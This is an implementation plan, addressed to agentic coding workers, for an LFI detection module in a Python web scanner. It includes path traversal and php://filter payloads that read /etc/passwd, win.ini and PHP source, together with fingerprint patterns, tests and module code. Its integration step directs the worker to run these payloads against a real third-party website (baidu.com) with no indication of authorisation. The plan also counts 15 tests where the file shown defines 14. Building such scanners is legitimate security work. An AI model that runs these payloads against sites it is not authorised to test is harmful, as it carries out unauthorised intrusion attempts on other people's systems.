# LFI Detection (Phase 5) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add an `lfi` module that detects local/remote file inclusion via path traversal payloads and PHP wrapper techniques, matching file content fingerprints in responses.

**Architecture:** New module `scanner/modules/lfi.py` (~170 lines) following the same pattern as `sqli.py` and `cmdi.py` — pure function for pattern matching, module class with single-phase detection. Uses `_extract_params`/`_make_test_url` from `html_utils.py`, `generate_variants` from `encoding.py` (with empty technique list — no encoding bypass needed for path traversal). Registers in CLI with display in output.

**Tech Stack:** Python 3.13, re (stdlib), urllib.parse (stdlib), concurrent.futures (stdlib)

---

### File Structure

| File | Action | Purpose |
|------|--------|---------|
| `scanner/modules/lfi.py` | Create | Module: payloads, patterns, LfiModule class |
| `tests/test_lfi.py` | Create | Tests for pure functions + module attributes |
| `scanner/cli.py` | Modify | Import + register LfiModule in MODULE_CLASSES |
| `scanner/core/output.py` | Modify | Add `lfi` display in `log_finding()` |

### Encoding Strategy

Path traversal does not benefit from the existing SQL/XSS encoding techniques — `_url_encode` doesn't encode `.` or `/`, `_comment_inject` is SQL-specific, `_html_entity` targets HTML parsing. Using `LFI_TECHNIQUES = []` so `generate_variants` returns only the plain variant, keeping the architectural pattern intact.

### Payloads (8)

```python
_LFI_PAYLOADS = [
    {"path": "../../../../etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "....//....//....//....//etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "..\\/..\\/..\\/..\\/etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "../../../../windows/win.ini", "os": "Windows", "file": "win.ini"},
    {"path": "..\\..\\..\\..\\windows\\win.ini", "os": "Windows", "file": "win.ini"},
    {"path": "../../etc/passwd%00", "os": "Unix", "file": "/etc/passwd"},
    {"path": "php://filter/convert.base64-encode/resource=index", "os": "Unix", "file": "index.php"},
    {"path": "php://filter/read=convert.base64-encode/resource=index.php", "os": "Unix", "file": "index.php"},
]
```

### File Content Fingerprints

```python
_LFI_PATTERNS = {
    "/etc/passwd": [
        r"root:x:0:0:",
        r"daemon:x:\d+:",
        r"nobody:x:\d+:",
        r"bin:x:\d+:",
        r"mail:x:\d+:",
    ],
    "win.ini": [
        r"\[fonts\]",
        r"\[extensions\]",
        r"\[files\]",
        r"\[Mail\]",
    ],
    "index.php": [  # after base64 decode
        r"<\?php",
        r"<\?=",
        r"namespace\s+\w+",
    ],
}
```

### Finding Structure

```python
{
    "type": "lfi",
    "parameter": "file",
    "url": "http://example.com?file=....//....//etc/passwd",
    "os": "Unix",
    "file": "/etc/passwd",
    "encoding": "plain",
    "evidence": "File content 'root:x:0:0:' found in response",
}
```

---

### Task 1: Write tests + implement lfi.py

**Files:**
- Create: `tests/test_lfi.py`
- Create: `scanner/modules/lfi.py`

- [ ] **Step 1: Write tests/test_lfi.py**

```python
"""Tests for LFI detection module."""
import re
from scanner.modules.lfi import (
    _check_lfi_patterns,
    _is_base64,
    _decode_if_base64,
    _LFI_PAYLOADS,
    _LFI_PATTERNS,
    LfiModule,
)


class TestCheckLfiPatterns:
    def test_detects_passwd_content(self):
        text = "root:x:0:0:root:/root:/bin/bash\n daemon:x:1:1:daemon:/usr/sbin"
        result = _check_lfi_patterns(text)
        assert result is not None
        assert result["file"] == "/etc/passwd"

    def test_detects_win_ini_content(self):
        text = "[fonts]\n[extensions]\n[files]"
        result = _check_lfi_patterns(text)
        assert result is not None
        assert result["file"] == "win.ini"

    def test_detects_php_source_in_plain_text(self):
        text = '<?php echo "hello"; ?>'
        result = _check_lfi_patterns(text)
        assert result is not None
        assert result["file"] == "index.php"

    def test_no_match_on_normal_html(self):
        text = "<html><body><h1>Welcome</h1></body></html>"
        result = _check_lfi_patterns(text)
        assert result is None


class TestBase64Detection:
    def test_is_base64_for_valid_b64(self):
        assert _is_base64("PD9waHAgZWNobyAiaGVsbG8iOyA/Pg==") is True

    def test_is_base64_rejects_plain_text(self):
        assert _is_base64("hello world") is False

    def test_decode_if_base64_decodes_valid(self):
        result = _decode_if_base64("PD9waHAgZWNobyAiaGVsbG8iOyA/Pg==")
        assert "<?php" in result

    def test_decode_if_base64_returns_original_for_non_b64(self):
        text = "<html>normal content</html>"
        result = _decode_if_base64(text)
        assert result == text


class TestPayloads:
    def test_has_eight_payloads(self):
        assert len(_LFI_PAYLOADS) == 8

    def test_payloads_cover_both_os(self):
        os_set = {p["os"] for p in _LFI_PAYLOADS}
        assert "Unix" in os_set
        assert "Windows" in os_set

    def test_payloads_have_required_fields(self):
        for p in _LFI_PAYLOADS:
            assert "path" in p
            assert "os" in p
            assert "file" in p


class TestPatterns:
    def test_patterns_cover_three_file_types(self):
        assert "/etc/passwd" in _LFI_PATTERNS
        assert "win.ini" in _LFI_PATTERNS
        assert "index.php" in _LFI_PATTERNS

    def test_each_file_has_multiple_patterns(self):
        for patterns in _LFI_PATTERNS.values():
            assert len(patterns) >= 2


class TestModule:
    def test_module_attributes(self):
        mod = LfiModule()
        assert mod.name == "lfi"
        assert mod.requires_url is True
        assert "lfi" in mod.description.lower() or "file" in mod.description.lower()
```

- [ ] **Step 2: Run tests — expect FAIL**

Run: `pytest tests/test_lfi.py -v`
Expected: `ModuleNotFoundError: No module named 'scanner.modules.lfi'`

- [ ] **Step 3: Create scanner/modules/lfi.py**

```python
"""LFI detection -- path traversal + PHP wrappers."""
import base64
import re
import string
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

from scanner.modules.base import BaseModule
from scanner.core.html_utils import _extract_params, _make_test_url
from scanner.core.encoding import generate_variants


# ── LFI Techniques ──────────────────────────────────────────────────
# Path traversal doesn't benefit from SQL/XSS encoding techniques.
# Using empty list so generate_variants returns only the plain variant.

LFI_TECHNIQUES = []

# ── Path Traversal Payloads ─────────────────────────────────────────

_LFI_PAYLOADS = [
    {"path": "../../../../etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "....//....//....//....//etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "..\\/..\\/..\\/..\\/etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "../../../../windows/win.ini", "os": "Windows", "file": "win.ini"},
    {"path": "..\\..\\..\\..\\windows\\win.ini", "os": "Windows", "file": "win.ini"},
    {"path": "../../etc/passwd%00", "os": "Unix", "file": "/etc/passwd"},
    {"path": "php://filter/convert.base64-encode/resource=index", "os": "Unix", "file": "index.php"},
    {"path": "php://filter/read=convert.base64-encode/resource=index.php", "os": "Unix", "file": "index.php"},
]

# ── File Content Fingerprints ───────────────────────────────────────

_LFI_PATTERNS = {
    "/etc/passwd": [
        r"root:x:0:0:",
        r"daemon:x:\d+:",
        r"nobody:x:\d+:",
        r"bin:x:\d+:",
        r"mail:x:\d+:",
    ],
    "win.ini": [
        r"\[fonts\]",
        r"\[extensions\]",
        r"\[files\]",
        r"\[Mail\]",
    ],
    "index.php": [
        r"<\?php",
        r"<\?=",
        r"namespace\s+\w+",
    ],
}


# ── Pure Functions (testable) ───────────────────────────────────────

def _is_base64(text):
    """Check if text looks like base64-encoded content."""
    if len(text) < 20:
        return False
    # Base64 alphabet + padding
    valid_chars = set(string.ascii_letters + string.digits + "+/=")
    # Allow some newlines/whitespace
    printable = set(text.replace("\n", "").replace("\r", "").replace(" ", ""))
    if not printable.issubset(valid_chars):
        return False
    # Must have reasonable ratio of base64 chars
    b64_chars = sum(1 for c in text if c in valid_chars)
    return b64_chars / max(len(text), 1) > 0.9


def _decode_if_base64(text):
    """Attempt base64 decode if the text looks base64-encoded. Returns original on failure."""
    if not _is_base64(text):
        return text
    # Strip whitespace and try decoding
    try:
        cleaned = re.sub(r'\s+', '', text)
        decoded = base64.b64decode(cleaned).decode("utf-8", errors="replace")
        # Only return decoded if it contains meaningful content
        if len(decoded) > 10:
            return decoded
    except Exception:
        pass
    return text


def _check_lfi_patterns(text):
    """Scan response text for file content fingerprints.

    For PHP wrapper payloads, the response may be base64-encoded source.
    Check both the raw text and base64-decoded text.

    Returns {"file": str, "pattern": str} or None.
    """
    # Check raw text first
    for file_name, patterns in _LFI_PATTERNS.items():
        for pat in patterns:
            if re.search(pat, text, re.IGNORECASE):
                return {"file": file_name, "pattern": pat}

    # Try base64 decode for PHP wrapper responses
    decoded = _decode_if_base64(text)
    if decoded is not text:
        for pat in _LFI_PATTERNS.get("index.php", []):
            if re.search(pat, decoded, re.IGNORECASE):
                return {"file": "index.php", "pattern": pat}

    return None


# ── LfiModule ───────────────────────────────────────────────────────

class LfiModule(BaseModule):
    name = "lfi"
    description = "Detect local file inclusion via path traversal + PHP wrappers"
    requires_url = True

    def run(self, target, request_handler, output):
        """Run LFI detection against target."""
        target = target.rstrip("/")
        output.log_progress(f"Fetching {target} for parameter extraction...")

        try:
            resp = request_handler.get(target)
            html = resp.text
        except Exception as e:
            output.log_progress(f"Failed to fetch {target}: {e}")
            return {"module": self.name, "findings": []}

        param_names = _extract_params(target, html)

        # If URL has no obvious params, try the URL query itself
        if not param_names:
            parsed = urllib.parse.urlparse(target)
            if parsed.query:
                param_names = [
                    {"name": k, "method": "GET"}
                    for k in urllib.parse.parse_qs(parsed.query).keys()
                ]

        if not param_names:
            output.log_progress("No testable parameters found on this page")
            return {"module": self.name, "findings": []}

        param_list = [f"{p['name']}({p['method']})" for p in param_names]
        output.log_progress(
            f"Found {len(param_names)} potential parameters: {param_list}"
        )

        findings = []
        param_has_finding = set()

        output.log_progress(
            f"Testing {len(_LFI_PAYLOADS)} LFI payloads across "
            f"{len(param_names)} parameters"
        )

        with ThreadPoolExecutor(max_workers=3) as pool:
            futures = {}
            for entry in param_names:
                pname = entry["name"]
                method = entry["method"]
                for lfi_entry in _LFI_PAYLOADS:
                    payload = lfi_entry["path"]
                    for encoded, tech in generate_variants(payload, LFI_TECHNIQUES):
                        if method == "POST":
                            test_url = target
                            futures[pool.submit(
                                request_handler.post, target,
                                data={pname: encoded}
                            )] = (pname, lfi_entry, test_url, tech)
                        else:
                            test_url = _make_test_url(target, pname, encoded)
                            futures[pool.submit(
                                request_handler.get, test_url
                            )] = (pname, lfi_entry, test_url, tech)

            bar = output.create_progress_bar("LFI", len(futures))
            for future in as_completed(futures):
                pname, lfi_entry, test_url, tech = futures[future]
                try:
                    resp = future.result()
                    match = _check_lfi_patterns(resp.text)
                    if match:
                        if pname not in param_has_finding:
                            param_has_finding.add(pname)
                            finding = {
                                "type": "lfi",
                                "parameter": pname,
                                "url": test_url,
                                "os": lfi_entry["os"],
                                "file": match["file"],
                                "encoding": tech,
                                "evidence": (
                                    f"File content fingerprint "
                                    f"'{match['pattern']}' found in response"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                except Exception:
                    pass
                output.update_progress(bar)
            bar.close()

        output.log_progress(
            f"LFI done: {len(findings)} potential inclusions found"
        )
        return {"module": self.name, "findings": findings}
```

- [ ] **Step 4: Run tests — expect PASS**

Run: `pytest tests/test_lfi.py -v`
Expected: All 15 tests pass.

- [ ] **Step 5: Commit**

```bash
git add scanner/modules/lfi.py tests/test_lfi.py
git commit -m "feat: add LFI detection module"
```

---

### Task 2: Register in CLI + output display

**Files:**
- Modify: `scanner/cli.py:14-18` (add import + to MODULE_CLASSES)
- Modify: `scanner/core/output.py:84-92` (add display before `log_progress`)

- [ ] **Step 1: Register in CLI**

Edit `scanner/cli.py`, add import after the `cmdi` import:

```python
from scanner.modules.lfi import LfiModule
```

Edit `scanner/cli.py`, MODULE_CLASSES list:

```python
MODULE_CLASSES = [SubdomainModule, DirscanModule, ParamsModule, SqliModule, XssModule, DomXssModule, StoredXssModule, CmdiModule, LfiModule]
```

- [ ] **Step 2: Add display in output.py**

Add after the `cmdi` elif block:

```python
        elif module_name == "lfi":
            os_name = finding.get("os", "?")
            file_name = finding.get("file", "?")
            param = finding.get("parameter", "?")
            print(f"[{module_name}] {finding['type']} ({os_name}): {param} "
                  f"— {file_name} — {finding.get('url', '')}")
```

- [ ] **Step 3: Verify list + tests**

```bash
python -m scanner list
pytest tests/ -v
```

Expected: `lfi` appears in module list. All tests pass (127 + 15 = 142).

- [ ] **Step 4: Commit**

```bash
git add scanner/cli.py scanner/core/output.py
git commit -m "feat: register lfi module and add display"
```

---

### Task 3: Integration test + push

- [ ] **Step 1: Test against target**

Run: `python -m scanner scan "https://www.baidu.com" -m lfi -v`

Expected: Extracts parameters, runs LFI testing. No crashes.

- [ ] **Step 2: Run full test suite**

Run: `pytest tests/ -v`
Expected: All 142 tests pass.

- [ ] **Step 3: Push**

```bash
git push
```
